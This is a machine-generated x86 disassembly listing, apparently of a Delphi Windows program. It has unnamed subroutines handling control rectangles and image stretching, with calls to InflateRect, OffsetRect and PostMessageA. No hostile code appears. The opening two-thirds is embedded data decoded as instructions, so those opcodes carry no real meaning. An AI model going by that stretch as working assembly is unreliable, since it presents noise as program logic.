add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
push 0x32dc0044
inc ecx
add [ eax - 0x3ffbfcb ] ah
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
jo r-xdata
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
0x42
add [ eax + esi * 4 ] cl
push cs
mov al 0x5
add ch bh
push [ esi + 0x42fb50ff ]
add [ eax - 0x5bffbd05 ] dl
sti
inc edx
add [ ebx + edi * 8 - 0x8d3ffbe ] bh
inc edx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc edx
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ ecx + ecx * 2 - 0x6c3ffbf ] dh
inc edx
add [ eax ] ah
sbb al [ eax + eax + 0x50 ]
stc
inc edx
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
push 0x840042ca
jo r-xdata
sahf
add [ ebx ] cl
add [ eax ] cl
inc ebp
js r-xdata
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ebx
je r-xdata
inc ecx
add [ eax - 0xa ] dl
inc edx
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax + 0x70 ] es
pushfd
inc ebx
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add ah cl
pushfd
inc ebx
add [ edi + ebx * 2 ] cl
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax - 0x7ffbb73 ] bl
stosb [ edi ]
inc esp
add [ edi + ebx * 4 - 0x75ebffbc ] cl
inc esp
add [ ecx * 4 - 0x6323ffbc ] al
inc ebx
add [ eax + 0xb0042fb ] bh
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
inc ecx
add [ eax ] bl
mov [ 0xffffffffa5400041 ] al
insb
jae r-xdata
add ah ah

sub_42ccc2
inc edx
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
in al 0xcb
inc edx
add [ ebx + ecx * 8 + 0x42 ] ch
add [ edi ] ch
add [ eax ] cl
inc ebp
js r-xdata
and [ 0x45980044 ] 0x44
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
add [ eax ] al
and eax 0x45980044
insb
jae r-xdata
add bh bh
add [ ecx ] ah
add bh bh
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edi + ecx * 8 ] al
inc ebx
add [ ebx ] bl
add bh bh
sbb al [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
sub al 0xd6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
in al 0x18
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
add dh bh
je r-xdata
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
inc esp
mov es [ eax + eax - 0x18 ]
mov es [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
inc esp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd465646f
aad 0x43
add [ eax + 0x25 ] dl
inc esp
add [ eax - 0x67ffbbdb ] al
inc ebp
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ esp + ebp * 8 - 0x32 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc [ esi + 0x44 ]
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
adc [ eax ] al
sbb [ edx ] al
add bh bh
in al dx
stc
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ esi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add bh bh
inc esp
inc esp
jb r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax - 0xfffffb ] al
sldt [ 0x6f6c6f43 ]
jb r-xdata
aad 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
daa
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
xor ah 0xff
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
adc [ eax ] al
sbb al 0x2
add bh bh
mov ah 0xf9
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
outsb
je r-xdata
pop [ eax + eax - 0x60 ]
pop [ eax + eax + 0x1 ]
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test eax 0xf4ff0001
mov es [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
sbb al 0x0
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
test [ edi + 0xbc0044 ] bl
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
sbb eax [ ebp ]
jl r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
and [ edi - 0x705fffbc ] cl
inc esp
add [ ecx ] al
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
push [ eax + 0x24 ]
add bh bh
or [ 0x10044 ] ah
add [ eax ] al
cmp [ esi + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070025 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x2c656c62
sbb al [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
adc [ eax ] al
0xc4ff0000 0x4426
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
jl r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f090029 ] al
outsb
js r-xdata
adc [ eax ] al
cdq
add [ eax ] al
jmp [ eax + 0x68004426 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
je r-xdata
jne r-xdata
push ebx
je r-xdata
sub al 0x1a
inc ecx
add al al
add [ eax ] eax
fiadd [ ebx ]
sbb [ ecx ] al
push eax
outsd
jo r-xdata
inc esi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
adc al 0x27
inc esi
jb r-xdata
jb r-xdata
push ebx
je r-xdata
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
inc esp
insd
or [ gs : ebp + 0x78 ] al
je r-xdata
inc edx
popad
inc esp
outsd
arpl [ ebx - 0x24 ] bp
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
dec edi
outsb
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
sbb al [ ecx ]
enter 0x1 0xff
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
fld [ ebx ]
call 0xffffffffe941d0d5
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
arpl [ gs : eax + ecx + 0x7 ] si
je r-xdata
rol [ edx ] 0x1
push eax
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
arpl [ ebp + eax + 0x54 ] si
push ebx
imul edi [ edx + 0x65 ] 0x746e4907
jb r-xdata
je r-xdata
add [ eax ] al
adc [ eax ] al
nop
jb r-xdata
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
movsb [ edi ] [ esi ]
rol [ edx ] cl
or [ esi ] cl
push esp
inc edx
popad
outsb
dec ecx
outsb
outsw
inc ebp
jbe r-xdata
insb
jae r-xdata
jb r-xdata
inc ebp
jbe r-xdata
add ecx [ eax ]
push es
push ebx
rol [ edx ] cl
or [ esi ] cl
push esp
inc edx
popad
outsb
inc esp
jb r-xdata
lea eax [ bx + si ]
hlt
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
add bh bh
fild [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb al [ ecx ]
rol [ ecx ] 0x0
jo r-xdata
add eax 0x65530608
outsb
jb r-xdata
push edx
outsd
ja r-xdata
or [ edx + 0x6f ] dl
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
add eax 0x63655254
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] ch
rol [ edx ] cl
or [ esi ] cl
push esp
inc edx
popad
outsb
dec ebp
outsd
jbe r-xdata
outsb
je r-xdata
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
outsd
insb
add [ esp + eax * 2 ] eax
outsb
jb r-xdata
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x6974704f
outsd
outsb
jae r-xdata
rol [ edx ] cl
push es
adc [ edx + eax * 2 + 0x61 ] edx
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
arpl [ gs : eax + ecx + 0x7 ] si
je r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
or [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
fadd [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
push 0x65
outsd
jne r-xdata
arpl [ ecx + eax + 0x7 ] si
outsd
insb
adc [ 0x63655241 ] eax
je r-xdata
push eax
jb r-xdata
or eax 0x66657250
jb r-xdata
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
push edx
arpl [ gs : eax + eax + 0x1c ] si
adc [ eax ] eax
aam 0xe1
inc ebx
push edx
arpl [ gs : ebp + eax + 0x54 ] si
jb r-xdata
jb r-xdata
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
aam 0x42
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
dec edi
jo r-xdata
inc ecx
push edx
arpl [ gs : ebp + eax + 0x54 ] si
outsd
add [ eax ] al
mov eax eax
jl r-xdata
je r-xdata
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
push eax
std
imul ebp [ edi + 0x6e ] 0x42541173
popad
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x6974704f
outsd
outsb
jae r-xdata
add [ ecx + edx ] bl
inc eax
add ah dl
loope r-xdata
push esp
jb r-xdata
arpl [ eax + ecx + 0x7 ] si
push 0x65
outsb
je r-xdata
inc ebx
or [ edi ] al
arpl [ eax + ecx + 0x7 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
outsd
insb
adc [ esi ] eax
dec ecx
outsb
jae r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 8 + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
insb
or [ esi ] al
inc ebx
outsd
outsb
je r-xdata
add [ eax ] cl
andps xmm0 [ edx + 0x61 ]
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x6e657645
je r-xdata
inc edx
add [ ecx + edx ] bl
dec ecx
outsb
je r-xdata
sbb al 0x11
inc eax
add ah dl
loope r-xdata
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + 0x42d37cc0 ] cl
adc [ 0x63655241 ] eax
insb
add ecx [ eax ]
push es
push ebx
outsb
je r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x24 ] bp
fiadd [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x42
jae r-xdata
jb r-xdata
dec eax
aad 0x42
add [ ebp + edx * 8 + 0x2600042 ] cl
add [ eax ] al
hlt
add [ eax ] bh
mov esp 0x41
add [ eax ] al
xor dl dl
inc edx
add [ ebx + 0x42d404c0 ] cl
add [ ecx ] al
or [ edx + edx * 2 + 0x6f ] dl
ja r-xdata
add [ edi ] eax
push edx
arpl [ gs : ecx + eax + 0x7 ] si
push esp
push esp
inc ebx
popad
outsb
jbe r-xdata
inc eax
add ah dl
loope r-xdata
sbb al 0x11
inc edx
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ esp + edi * 8 - 0x6c4fffbe ] al
inc esp
add [ eax + 0xe ] dl
inc ebx
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esi + edi * 8 ] dl
inc edx
add [ edx ] ah
inc esp
add al cl
std
inc edx
add [ edi + ebx * 2 ] cl
inc esp
add [ ebx * 2 + 0x62bc0044 ] bh
inc esp
add al al
bound eax [ eax + eax + 0x78 ]
popad
inc esp
add [ eax ] ah
popad
inc esp
add [ eax - 0x7ffbb73 ] bl
stosb [ edi ]
inc esp
add [ edi + ebx * 4 - 0x75ebffbc ] cl
inc esp
add [ ecx * 4 + 0x15cc0044 ] al
inc ebx
add [ esp + ebx + 0x1cac0043 ] cl
inc ebx
add [ eax + 0x1b ] ch
inc ebx
add [ esp + edx + 0x154c0043 ] cl
inc ebx
add [ eax + 0xb00430d ] bl
add [ eax + esi * 4 ] ch
sbb al 0xb0
add [ ebp - 0x3bffec ] bh
xlat
inc eax
add [ eax - 0x3 ] dl
imul edi [ edx + 0x65 ] 0x105
add bh bh
jae r-xdata
je r-xdata
add eax 0x63655241
sub_42df4c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d6c0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41dea4
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d6c0
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41dea4
pop ebx
mov esp ebp
pop ebp
retn
sub_42e010
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41d7ec
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_42df4c
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42e070
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_449fcc
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4202a4
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42e4b4
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_403558
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_441d30
mov edx 0x69
mov eax ebx
call sub_441d0c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_42e108
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44a028
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_42e154
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_4209c4
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_4209dc
mov edi eax
mov eax ebx
call sub_441f54
mov [ esp ] eax
mov eax ebx
call sub_441f98
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402b0c
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402b0c
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402b0c
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402b0c
mov esi eax
jmp r-xdata
sub_42e280
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_42e331
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42e154
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_41df24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e338
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41d7bc
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_41dae4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_41dedc
sub_42e340
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_45a2f0
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_449088
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_448d84
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_443750
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_42e3d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
